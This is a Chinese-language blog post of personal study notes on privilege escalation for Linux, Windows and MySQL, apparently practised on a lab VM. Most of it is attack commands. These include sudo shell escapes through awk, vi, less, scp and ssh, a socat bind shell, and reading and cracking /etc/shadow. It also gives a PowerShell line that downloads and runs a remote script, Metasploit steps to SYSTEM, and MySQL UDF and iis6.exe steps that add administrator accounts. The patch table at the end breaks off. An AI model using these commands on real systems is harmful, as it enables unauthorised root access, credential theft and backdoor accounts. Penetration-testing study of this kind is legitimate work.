<!DOCTYPE html>
<html lang="zh-CN">

  
<head>
  <meta charset="utf-8">
  <meta name="author" content="johnscott" />
  
  
  
  <title>55提权 | JohnScott2046的博客</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="网络安全,网络安全," />
  

  <script>
    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
  </script>

  
    <meta name="description" content="超级帽子戏法的个人博客,主要记录复制粘贴过来的笔记,还有自己的一些心得体会">
  

  

  
    <link rel="icon" href="/images/favicon.ico">
    <link rel="apple-touch-icon" href="/images/touch-icon.png">
  

  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/base.css">
<link rel="stylesheet" href="/icon/iconfont.css">
<link rel="stylesheet" href="/css/github-markdown.css">
<link rel="stylesheet" href="/css/highlight.css">


  
<script src="/js/util.js"></script>
<script src="/js/valine.min.js"></script>


  

  
    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
  

  
    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
  
  
  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
  
  
    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
  

<meta name="generator" content="Hexo 5.1.1"></head>

  <body>

    

    <div id="app">

      <div class="header-wrap">
  <header>
    <div class="site-brand">
      <div class="site-title">
        <a href="/">JohnScott2046</a>
      </div>
    </div>
    <nav class="site-navigation">
      <ul class="nav-menu">
      
        <li class="nav-item" data-path="/">
          
            <a 
              href="/"
              target="_self"
            >
              主页
            </a>
          
        </li>
      
        <li class="nav-item" data-path="/archives/">
          
            <a 
              href="/archives/"
              target="_self"
            >
              归档
            </a>
          
        </li>
      
        <li class="nav-item" data-path="/categories/">
          
            <a 
              href="/categories/"
              target="_self"
            >
              分类
            </a>
          
        </li>
      
        <li class="nav-item" data-path="/tags/">
          
            <a 
              href="/tags/"
              target="_self"
            >
              标签
            </a>
          
        </li>
      
        <li class="nav-item" data-path="/friends/">
          
            <a 
              href="/friends/"
              target="_self"
            >
              友链
            </a>
          
        </li>
      
        <li class="nav-item" data-path="/about/">
          
            <a 
              href="/about/"
              target="_self"
            >
              关于
            </a>
          
        </li>
      
        <li class="nav-item" data-path="">
          
            <a href="javascript:void(0);" v-else>联系我</a>
            <ul class="nav-menu--dropdown">
              
                <li>
                  <a 
                    href="https://github.com/liuxue5213" 
                    target="_blank"
                  >
                    Github
                  </a>
                </li>
              
                <li>
                  <a 
                    href="https://www.zhihu.com/people/liuxue5213" 
                    target="_blank"
                  >
                    知乎
                  </a>
                </li>
              
                <li>
                  <a 
                    href="http://weibo.com/liuxue5213" 
                    target="_blank"
                  >
                    微博
                  </a>
                </li>
              
                <li>
                  <a 
                    href="https://www.douban.com/people/liuxue5213" 
                    target="_blank"
                  >
                    豆瓣
                  </a>
                </li>
              
                <li>
                  <a 
                    href="/linkedin.com/in/liuxue5213" 
                    target="_blank"
                  >
                    linkedin
                  </a>
                </li>
              
            </ul>
          
        </li>
      
      </ul>
    </nav>
    <i class="iconfont icon-menu"></i>
  </header>
</div>

<script>
  let links = document.querySelectorAll('.nav-item');
  for(let link of links){
    let childrenLink = link.querySelector('ul');
    link.addEventListener('mouseenter', () => {
      if(childrenLink) {
        childrenLink.className = "nav-menu--dropdown active";
      }
    })
    link.addEventListener('mouseleave', () => {
      if(childrenLink) {
        childrenLink.className = "nav-menu--dropdown";
      }
    })
  }
  let rootRealPath = getRealPath(window.location.pathname, true);
  for(let link of links) {
    let linkPath = link.getAttribute("data-path");
    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
      link.className = "nav-item hover";
    }
  }

  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
    iconMenuClicked = false;
  let navDOM = document.querySelector("nav.site-navigation");
  iconMenu.addEventListener("click", () => {
    iconMenuClicked 
      ? navDOM.className = "site-navigation active"
      : navDOM.className = "site-navigation";
    iconMenuClicked = !iconMenuClicked;
  })
</script>

      








<div class="container post-index">

  

<div class="post">
  <h1 class="article-title">
    <span>55提权</span>
  </h1>
  <div class="article-top-meta">
    <span>
      发布 : 
      2022-01-21
    </span>
    
      <span>
        分类 : 
          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
            网络安全
          </a>
      </span>
    
    
      <span>
        浏览 : <span class="article-timer" data-identity="56提权"></span>
      </span>
    
  </div>

  

  <div class="article-content">
    <div class="markdown-body">
      <h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>提权目的：权限低，无法进行后续操作</p>
<h2 id="一、-linux提权"><a href="#一、-linux提权" class="headerlink" title="一、 linux提权"></a>一、 linux提权</h2><h3 id="靶場"><a href="#靶場" class="headerlink" title="靶場"></a>靶場</h3><p><a target="_blank" rel="noopener" href="https://in.security/downloads/lin.security_v1.0.ova">https://in.security/downloads/lin.security_v1.0.ova</a></p>
<p>賬戶 bob   密碼 secret</p>
<p>su root   secret123</p>
<p>修改網絡地址<br>cat /etc/netplan/50-cloud-init.yaml<br>ethernets 下面網卡修改成 ens33<br>netplan apply</p>
<h3 id="sudo-Substitute-User-and-Do"><a href="#sudo-Substitute-User-and-Do" class="headerlink" title="sudo Substitute User and Do"></a>sudo Substitute User and Do</h3><p>用来临时赋予 root 权限运行某个程序</p>
<p>执行原理：</p>
<p>普通用户执行命令时，首先检查 /var/run/sudo/目录下(ubunto) /var/db/sudo/目录下(centos) 是否有用户时间戳，并检查是否过期；<br>如果时间戳过期，就需要输入当前用户的密码；<br>输入后检查 /etc/sudoers 配置文件，查看用户是否有 sudo 权限；<br>如果有执行 sudo 命令并返回结果，然后退出 sudo 返回到普通用户的 shell 环境；<br>而在 /etc/sudoers 中设置可执行 sudo 指令的用户，默认只有root；</p>
<h3 id="发行类型-版本"><a href="#发行类型-版本" class="headerlink" title="发行类型  版本"></a>发行类型  版本</h3><p>cat /etc/issue<br>cat /etc/*-release<br>cat /etc/lsb-release     #Debian<br>cat /etc/redhat-release   #Redhat</p>
<h3 id="内核版本-32位还是64位"><a href="#内核版本-32位还是64位" class="headerlink" title="内核版本    32位还是64位"></a>内核版本    32位还是64位</h3><p>cat /proc/version<br>uname -a uname -mrs<br>rpm -q kernel<br>dmesg | grep Linux<br>ls /boot | grep vmlinuz-</p>
<h3 id="用sudo直接执行命令"><a href="#用sudo直接执行命令" class="headerlink" title="用sudo直接执行命令"></a>用sudo直接执行命令</h3><p>sudo ash<br>sudo bash<br>sudo /bin/bash<br>sudo dash<br>sudo csh<br>sudo sh<br>sudo curl<br>sudo zsh</p>
<h3 id="socat提权"><a href="#socat提权" class="headerlink" title="socat提权"></a>socat提权</h3><p>在服务端建立一个端口 9999 的 shell<br>socat tcp-listen:9999,reuseaddr,fork exec:sh,pty,stderr,setsid,sigint,sane</p>
<p>在本地机器启动本地的 9999 端口 LISTEN<br>socat FILE:<code>tty</code>,raw,echo=0 TCP:127.0.0.1:9999</p>
<h3 id="awk提权"><a href="#awk提权" class="headerlink" title="awk提权"></a>awk提权</h3><p>awk ‘BEGIN {system(“/bin/sh”)}’</p>
<h3 id="ed提权"><a href="#ed提权" class="headerlink" title="ed提权"></a>ed提权</h3><p>ed命令用于启动 ed文本编辑器，使用该命令访问空缓冲区来调用 bash/sh shell 造成提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ed</span><br><span class="line">!sh</span><br></pre></td></tr></table></figure>

<p>退出方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br><span class="line">q</span><br></pre></td></tr></table></figure>


<h3 id="env环境变量提权"><a href="#env环境变量提权" class="headerlink" title="env环境变量提权"></a>env环境变量提权</h3><p>有些应用程序使用了 system 等函数调用了系统命令，但是没有使用绝对路径而是使用 env 命令从环境变量中进行查找，这就可能通过修改环境变量来进行权限提升</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c &#39;cp $(which env) .; chmod +s .&#x2F;env&#39;</span><br><span class="line">.&#x2F;env &#x2F;bin&#x2F;sh -p</span><br></pre></td></tr></table></figure>


<h3 id="less、more、man提权"><a href="#less、more、man提权" class="headerlink" title="less、more、man提权"></a>less、more、man提权</h3><p>less</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less &#x2F;etc&#x2F;passwd</span><br><span class="line">!&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<p>more</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">more &#x2F;etc&#x2F;passwd</span><br><span class="line">!&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<p>man</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">man man</span><br><span class="line">!&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<h3 id="scp提权"><a href="#scp提权" class="headerlink" title="scp提权"></a>scp提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TF&#x3D;$(mktemp)</span><br><span class="line">echo &#39;sh 0&lt;&amp;2 1&gt;&amp;2&#39; &gt; $TF</span><br><span class="line">chmod +x &quot;$TF&quot;</span><br><span class="line">scp -S $TF x y:</span><br></pre></td></tr></table></figure>


<h3 id="sudo-pico提权"><a href="#sudo-pico提权" class="headerlink" title="sudo pico提权"></a>sudo pico提权</h3><p>^R^X       按crtl+r,crtl+x<br>reset; sh 1&gt;&amp;0 2&gt;&amp;0</p>
<h3 id="pico提权"><a href="#pico提权" class="headerlink" title="pico提权"></a>pico提权</h3><p>sudo pico<br>^R^X       按crtl+r,crtl+x<br>reset; sh 1&gt;&amp;0 2&gt;&amp;0</p>
<p>操作方法：在键盘上按 ctrl+r 和 ctrl+x 然后执行下面的命令，执行完成之后再次按住<br>ctrl+r 和 ctrl+x 再输入要执行的命令，比如id，那么就会以 root 权限执行</p>
<h3 id="ssh提权"><a href="#ssh提权" class="headerlink" title="ssh提权"></a>ssh提权</h3><p>ssh -o ProxyCommand=’;sh 0&lt;&amp;2 1&gt;&amp;2’ x</p>
<h3 id="vi提权"><a href="#vi提权" class="headerlink" title="vi提权"></a>vi提权</h3><p>vi -c ‘:!/bin/sh’ /dev/null</p>
<h3 id="rvim提权"><a href="#rvim提权" class="headerlink" title="rvim提权"></a>rvim提权</h3><p>sudo rvim -c ‘:python3 import os; os.execl(“/bin/sh”, “sh”, “-c”, “reset; exec sh”)’</p>
<h3 id="tclsh提权-待实现"><a href="#tclsh提权-待实现" class="headerlink" title="tclsh提权(待实现)"></a>tclsh提权(待实现)</h3><p>Tcl 是一种脚本语言，是一种基于字符串的命令语言</p>
<p>sudo tclsh<br>exec /bin/sh &lt;@stdin &gt;@stdout 2&gt;@stderr</p>
<h3 id="git提权"><a href="#git提权" class="headerlink" title="git提权"></a>git提权</h3><p>git -p help config<br>!/bin/sh</p>
<h3 id="script提权"><a href="#script提权" class="headerlink" title="script提权"></a>script提权</h3><p>sudo script -q /dev/null</p>
<h3 id="hash爆破、-john爆破-待实现"><a href="#hash爆破、-john爆破-待实现" class="headerlink" title="hash爆破、 john爆破(待实现)"></a>hash爆破、 john爆破(待实现)</h3><p>查看 cat /etc/passwd，发现类似 root:x:0:0:root:/root:/bin/bash，<br>在这种情况下，x 表示该用户的密码哈希存储在 /etc/shadow 中</p>
<h3 id="xxd提权-待实现"><a href="#xxd提权-待实现" class="headerlink" title="xxd提权(待实现)"></a>xxd提权(待实现)</h3><p>xxd命令可以为标准输入内容或者文件做一次十六进制的输出，也可以将十六进制输出转换为原来的二进制格式，当 suid 和执行权限一起使用将会造成提权</p>
<p>cat /etc/group<br>find / -name “.<em>“ -type f -path “/home/</em>“ -exec ls -al {} ;   查找secret文件</p>
<p>用密码登录 test 账户，使用 xxd 命令读取/etc/shadow 文件<br>xxd “/etc/shadow” | xxd -r<br>john –worldlist=/usr/share/wordlists/dict.txt pass      破解</p>
<h3 id="taskset提权-待实现"><a href="#taskset提权-待实现" class="headerlink" title="taskset提权(待实现)"></a>taskset提权(待实现)</h3><p>sudo taskset 1 /bin/bash -p</p>
<h3 id="使用Linux-Exploit-Suggester-sh寻找linux提权问题"><a href="#使用Linux-Exploit-Suggester-sh寻找linux提权问题" class="headerlink" title="使用Linux-Exploit-Suggester.sh寻找linux提权问题"></a>使用Linux-Exploit-Suggester.sh寻找linux提权问题</h3><p><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p>
<p>./linux-exploit-suggester.sh</p>
<h2 id="二、-Windows提权"><a href="#二、-Windows提权" class="headerlink" title="二、 Windows提权"></a>二、 Windows提权</h2><p>在Windwos中，权限大概分为四种，分别是Users、 Administrator、 System、 TrustedInstaller</p>
<p>其他 &lt; administrator管理员 &lt; system系统，多个权限组时，采用最小权限的策略</p>
<p>Users 普通用户权限，是系统中最安全的权限(因为分配给该组的默认权限不允许成员修改操作系统的设置或用户资料)。</p>
<p>Administrator 管理员权限，可以利用Windows的机制将自己提升为System权限，以便操作SAM文件等。</p>
<p>System 系统权限，可以对SAM等敏感文件进行读取，往往需要将Administrator权限提升到System权限才可以对散列值进行Dump操作。</p>
<p>TrustedInstaller Windows中的最高权限，对系统文件，即使拥有System权限也无法修改，只有拥有TrustedInstaller权限才可以修改系统文件</p>
<p>whoami 当前登录用户的身份<br>使用 net user 查看用户<br>systeminfo 查看系统信息，补丁版本 =&gt; 寻找exp</p>
<h3 id="Windows-Exploit-Suggester-需要python2环境"><a href="#Windows-Exploit-Suggester-需要python2环境" class="headerlink" title="Windows Exploit Suggester(需要python2环境)"></a>Windows Exploit Suggester(需要python2环境)</h3><p>可以将系统中已经安装的补丁程序与微软漏洞数据库进行比较，并可以识别可能导致权限提升的漏洞，而其只需要的只有目标系统的信息</p>
<p>下载地址 <a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></p>
<ol>
<li><p>systeminfo &gt; exploit.txt</p>
</li>
<li><p>下载安全公告数据库，下载的文件会自动在当前目录下以Excel电子表格的形式保存</p>
</li>
</ol>
<p>python windows-exploit-suggester.py –update</p>
<ol start="3">
<li>检查系统中是否存在未修复的漏洞</li>
</ol>
<p>pip install xlrd –upgrade</p>
<p>python windows-exploit-suggester.py -d 2022-01-08-mssb.xls -i exploit.txt</p>
<p><a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></p>
<p>./windows-exploit-suggester.py</p>
<h3 id="Powershell-Sherlock-Windows-Powershell运行"><a href="#Powershell-Sherlock-Windows-Powershell运行" class="headerlink" title="Powershell Sherlock(Windows Powershell运行)"></a>Powershell Sherlock(Windows Powershell运行)</h3><p>通过 Powershell 中的 Sherlock 脚本，可以快速查找可能用于本地权限提升的漏洞</p>
<p>下载地址 <a href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p>
<ol>
<li>导入 Sherlock 脚本</li>
</ol>
<p>Import-Module .\Sherlock.ps1</p>
<ol start="2">
<li>搜索所有未安装的补丁的漏洞</li>
</ol>
<p>Find-AllVulns</p>
<h3 id="通过CMD命令查找EXP"><a href="#通过CMD命令查找EXP" class="headerlink" title="通过CMD命令查找EXP"></a>通过CMD命令查找EXP</h3><p>systeminfo&gt;krystal.txt&amp;(for %i in ( KB4013389 KB3199135 KB3186973 KB3178466 KB3164038 KB3143145 KB3143141 KB3136041 K3134228 KB3089656 KB3067505 KB3077657 KB3057839 KB3057191 KB3031432 KB3036220 KB3023266 KB2989935 KB3011780 KB3000061 KB2992611 KB2975684 KB2914368 KB2850851 KB2840221 KB2778930 KB2972621 KB2671387 KB2592799 KB2566454 KB2503665 KB2393802 KB2305420 KB2267960 KB982799 KB2160329 KB977165 KB971468 KB975517 KB970483 KB959454 KB957097 KB958644 KB956803 KB941693 KB921883 KB899588 KB823980 ) do @type krystal.txt|@find /i “%i”|| @echo %i is Yes)&amp;del /f /q /a krystal.txt</p>
<h3 id="Windows10"><a href="#Windows10" class="headerlink" title="Windows10"></a>Windows10</h3><p>CVE-2020-0796 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/-chenxs/p/12618678.html">https://www.cnblogs.com/-chenxs/p/12618678.html</a></p>
<h3 id="Windows7-2008"><a href="#Windows7-2008" class="headerlink" title="Windows7/2008"></a>Windows7/2008</h3><p>CVE-2018-8120 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11404598.html">https://www.cnblogs.com/-mo-/p/11404598.html</a></p>
<h3 id="Windows7-8、2008-2012-2016"><a href="#Windows7-8、2008-2012-2016" class="headerlink" title="Windows7/8、2008/2012/2016"></a>Windows7/8、2008/2012/2016</h3><p>CVE-2017-0213 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11446144.html">https://www.cnblogs.com/-mo-/p/11446144.html</a></p>
<p>windows 2016 可以使用 SeImpersonatePrivilege 来进行本地提权 <a href="https://github.com/itm4n/PrintSpoofer">https://github.com/itm4n/PrintSpoofer</a></p>
<h3 id="SQL-Server、IIS-通杀-针对本地用户的，不能用于域用户"><a href="#SQL-Server、IIS-通杀-针对本地用户的，不能用于域用户" class="headerlink" title="SQL Server、IIS 通杀 (针对本地用户的，不能用于域用户)"></a>SQL Server、IIS 通杀 (针对本地用户的，不能用于域用户)</h3><p>MS16-075(RottenPotato)<br><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075</a></p>
<h3 id="使用Windows-Exploit-Suggester解析systeminfo"><a href="#使用Windows-Exploit-Suggester解析systeminfo" class="headerlink" title="使用Windows-Exploit-Suggester解析systeminfo"></a>使用Windows-Exploit-Suggester解析systeminfo</h3><p>下载地址 <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></p>
<p>./windows-exploit-suggester.py</p>
<h3 id="使用Linux-Exploit-Suggester-sh寻找linux提权问题-1"><a href="#使用Linux-Exploit-Suggester-sh寻找linux提权问题-1" class="headerlink" title="使用Linux-Exploit-Suggester.sh寻找linux提权问题"></a>使用Linux-Exploit-Suggester.sh寻找linux提权问题</h3><p>下载地址：<a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p>
<p>./linux-exploit-suggester.sh</p>
<h3 id="使用Sherlock工具"><a href="#使用Sherlock工具" class="headerlink" title="使用Sherlock工具"></a>使用Sherlock工具</h3><p>下载地址：<a href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p>
<p>Import-Module Sherlock.ps1<br>Find-AllVulns</p>
<h3 id="使用MSF查询补丁和可利用提权漏洞"><a href="#使用MSF查询补丁和可利用提权漏洞" class="headerlink" title="使用MSF查询补丁和可利用提权漏洞"></a>使用MSF查询补丁和可利用提权漏洞</h3><p>查询补丁</p>
<p>meterpreter&gt; run post/windows/gather/enum_patches<br>[+] KB2999226 installed on 11/25/2020<br>[+] KB976902 installed on 11/21/2010</p>
<p>查询Exp</p>
<p>msf&gt; use post/multi/recon/local_exploit_suggester<br>msf&gt; set LHOST &lt;攻击机IP&gt;<br>msf&gt; set SESSION <session_id><br>msf&gt; run</p>
<p>利用示例</p>
<p>msf&gt; use exploit/windows/local/cve_2019_1458_wizardopium<br>msf&gt; set SESSION <session_id><br>msf&gt; run<br>meterpreter&gt; getuid<br>Server username: NT AUTHORITY\SYSTEM</p>
<h3 id="使用powerup检查提权漏洞"><a href="#使用powerup检查提权漏洞" class="headerlink" title="使用powerup检查提权漏洞"></a>使用powerup检查提权漏洞</h3><p>powershell.exe -exec bypass -Command “&amp; {Import-Module .\PowerUp.ps1; Invoke-AllChecks}”<br>powershell.exe -nop -exec bypass -c “IEX (New-object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#39;);Invoke-AllChecks&quot;">https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#39;);Invoke-AllChecks&quot;</a></p>
<h3 id="使用accesschk-exe对系统扫描发现高权限可执行程序，且能够被低权限用户更改"><a href="#使用accesschk-exe对系统扫描发现高权限可执行程序，且能够被低权限用户更改" class="headerlink" title="使用accesschk.exe对系统扫描发现高权限可执行程序，且能够被低权限用户更改"></a>使用accesschk.exe对系统扫描发现高权限可执行程序，且能够被低权限用户更改</h3><p>accesschk “d:\dir”<br>查看所有用户在d盘dir路径的子路径的权限</p>
<p>accesschk “Administrator “d:\dir”<br>查看Administrator用户在d盘dir路径的子路径的权限</p>
<p>accesschk Administrators -c *<br>查看Administrators组对所有服务的权限</p>
<p>accesschk -k Guest hklm\software<br>查看Guest用户对hklm\software注册表的权限</p>
<p>accesschk -ou User<br>查看User用户对全局对象的权限</p>
<h3 id="查找主机上具有的CVE，查找具有公开EXP的CVE的Python脚本"><a href="#查找主机上具有的CVE，查找具有公开EXP的CVE的Python脚本" class="headerlink" title="查找主机上具有的CVE，查找具有公开EXP的CVE的Python脚本"></a>查找主机上具有的CVE，查找具有公开EXP的CVE的Python脚本</h3><p>下载地址：<a href="https://github.com/chroblert/WindowsVulnScan">https://github.com/chroblert/WindowsVulnScan</a></p>
<p>.\KBCollect.ps1<br>python3 -m pip install requirements.txt<br>cve-check.py -u</p>
<p>查看具有公开EXP的CVE<br>cve-check.py -C -f KB.json</p>
<h3 id="在线提权漏洞检测平台"><a href="#在线提权漏洞检测平台" class="headerlink" title="在线提权漏洞检测平台"></a>在线提权漏洞检测平台</h3><p>查询地址：<a target="_blank" rel="noopener" href="https://detect.secwx.com/">https://detect.secwx.com/</a></p>
<h3 id="提权辅助网页"><a href="#提权辅助网页" class="headerlink" title="提权辅助网页"></a>提权辅助网页</h3><p>在Windows提权的时候，这个网站数据源每周更新一次</p>
<p>查询地址：<a target="_blank" rel="noopener" href="http://bugs.hacking8.com/tiquan/">http://bugs.hacking8.com/tiquan/</a></p>
<h3 id="一、-提权方式"><a href="#一、-提权方式" class="headerlink" title="一、 提权方式"></a>一、 提权方式</h3><p>第三方工具<br>补丁、漏洞提权<br>mysql udf提权</p>
<h3 id="二、-第三方工具"><a href="#二、-第三方工具" class="headerlink" title="二、 第三方工具"></a>二、 第三方工具</h3><p>使用第三方软件进行提权： abc.exe     muma.exe =&gt; abc.exe 删除原文件，重命名<br>内存、内核溢出漏洞： 内存 =&gt; 存储数据 =&gt; 占用100% =&gt; 停止存储     =&gt; 特定情况下继续存储 =&gt; 溢出数据<br>exp 漏洞利用代码<br>poc 漏洞验证代码</p>
<p>iis漏洞  cer cdx 有的会被当做asp解析</p>
<p>iis6.exe 提权工具<br>iis6.exe “net user test 123456  /add”    添加一个用户<br>iis6.exe “whoami”<br>iis6.exe “net user test2 123456  /add”<br>iis6.exe “net localgroup administrators test2 /add”</p>
<p>runas /user:test2 cmd</p>
<h3 id="三、-补丁、漏洞提权"><a href="#三、-补丁、漏洞提权" class="headerlink" title="三、 补丁、漏洞提权"></a>三、 补丁、漏洞提权</h3><p>查询出系统的补丁信息，不同版本windows，同一個漏洞危害不同</p>
<p><a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan">https://i.hacking8.com/tiquan</a><br>1%2/3<em>4^5</em>6^7+8-9</p>
<p>phpstudy解析漏洞 有的会存在 图片的路径加上 /.php<br>二次渲染：上传的文件 服务器重新生成一个图片    有的上传会进行base64传输<br>使用bp抓取包，从网上将木马先进行base64，替换请求中的base64内容</p>
<p>服务器中间件 常见漏洞总结<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/192063.html">https://www.freebuf.com/articles/web/192063.html</a></p>
<p>準備各個版本的cmd，通過工具 上傳<br>ashelp  執行指定文件<br>ascmd 路徑<br>whoami systeminfo<br>上傳exp 進行提權</p>
<h3 id="四、-mysql-udf提权"><a href="#四、-mysql-udf提权" class="headerlink" title="四、 mysql udf提权"></a>四、 mysql udf提权</h3><p>udf提權 user defined function 用戶自定義函數<br>udf 獲取方式  ：sqlmap解碼   github</p>
<p>獲取目標架構<br>select @@version_compile_os,@@version_compile_machine,@@version<br>系統  類型  系統架構      版本</p>
<p>獲取數據庫 文件路徑<br>select @@plugin_dir;<br>show variables like ‘plugin%’</p>
<p>show global variables like ‘secure%’;<br>当secure_file_priv的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权</p>
<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/536d7fccb852">https://www.jianshu.com/p/536d7fccb852</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">insert into my_udf_data values(&quot;&quot;);</span><br><span class="line">update my_udf_data set data &#x3D; @my_udf_a;</span><br><span class="line">show variables like &#39;%plugin%&#39;;</span><br><span class="line">select data from my_udf_data into DUMPFILE &#39;D:\mysql\lib\plugin\udf64.dll&#39;;</span><br><span class="line"></span><br><span class="line">create function cmdshell returns string soname &#39;udf64.dll&#39;;</span><br><span class="line">select cmdshell(&#39;net user x x &#x2F;add&#39;);</span><br><span class="line">select cmdshell(&#39;net localgroup administrators x &#x2F;add&#39;);</span><br></pre></td></tr></table></figure>


<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><ol>
<li>命令行<br>certutil -encodehex -f -v udf.dll w32x.txt 4<br>w32x.txt  生成的文件，打開去除裡面的空格 nodepad</li>
</ol>
<p>數據庫方式 二進制  需要有數據庫<br>select hex(load_file(‘/udf/udf.so’)) into dumpfile ‘l64.hex’</p>
<p>遠程包導入 會暴露ip地址<br>select load_file(‘//ip/l64.so’) into dumpfile ‘/www/server/mysql/lib/plugin/l64.so’</p>
<ol start="2">
<li>寫入文件<br>select 0x  into dumpfile ‘/www/server/mysql/lib/plugin/1.so’</li>
</ol>
<p>Outfile 導出多行，寫文件時 數據有特殊轉換<br>Dumpfile  導出1行，會保持原數據寫入</p>
<ol start="3">
<li><p>生成函數<br>create function sys_eval returns string soname ‘1.so’<br>drop function sys_eval; 刪除 </p>
</li>
<li><p>執行指令<br>select sys_eval(‘whoami’)<br>將結果進行hex解碼</p>
</li>
</ol>
<h4 id="补充方法"><a href="#补充方法" class="headerlink" title="补充方法"></a>补充方法</h4><p>新建一个表，用来存放本地传来的udf文件的内容<br>create table foo (line blob);</p>
<p>在foo中写入udf文件内容<br>这里的tmp目录是plugin的目录，图上的plugin的目录是/usrlib64/mysql/plugin，所以这里我们就需要输入<br>insert into foo values(load_file(‘/usr/lib64/mysql/plugin/aa.so’));</p>
<p>将udf文件内容传入新建的udf文件中,这里的dumpfile要和用linEnum.sh查看的mysql的路径一致<br>select * from foo into dumpfile ‘/usr/lib/mysql/plugin/aa.so’;</p>
<p>创建sys_eval函数将他导入aa.so文件（aa.so就是udf.dll文件）<br>create function sys_eval returns string soname ‘aa.so’;</p>
<p>调用函数<br>select * from mysql.func where name = ‘sys_eval’;</p>
<p>执行Linux命令，找flag<br>select sys_eval(‘cat /flag’);</p>
<p>删除函数<br>drop function sys_eval;</p>
<p>删除表<br>drop table foo;</p>
<p>KB2360937|MS10-084<br>KB2478960|MS11-014<br>KB2507938|MS11-056<br>KB2566454|MS11-062<br>KB2646524|MS12-003<br>KB2645640|MS12-009<br>KB2641653|MS12-018<br>KB944653|MS07-067<br>KB952004|MS09-012 PR<br>KB971657|MS09-041<br>KB2620712|MS11-097<br>KB2393802|MS11-011<br>KB942831|MS08-005<br>KB2503665|MS11-046<br>KB2592799|MS11-080<br>KB956572|MS09-012烤肉<br>KB2621440|MS12-020<br>KB977165|MS10-015Ms Viru<br>KB3139914|MS16-032<br>KB3124280|MS16-016<br>KB3134228|MS16-014<br>KB3079904|MS15-097<br>KB3077657|MS15-077<br>KB3045171|MS15-051<br>KB3000061|MS14-058<br>KB2829361|MS13-046<br>KB2850851|MS13-053EPATHOBJ 0day 限32位<br>KB2707511|MS12-042 sysret -pid<br>KB2124261|KB2271195 MS10-065 IIS7<br>KB970483|MS09-020IIS6<br>KB3139914|MS16-032<br>KB3124280|MS16-016<br>KB3134228|MS16-014<br>KB3079904|MS15-097<br>KB3077657|MS15-077<br>KB3045171|MS15-051<br>KB3000061|MS14-058<br>KB2829361|MS13-046<br>KB2850851|MS13-053EPATHOBJ 0day 限32位<br>KB2707511|MS12-042 sysret 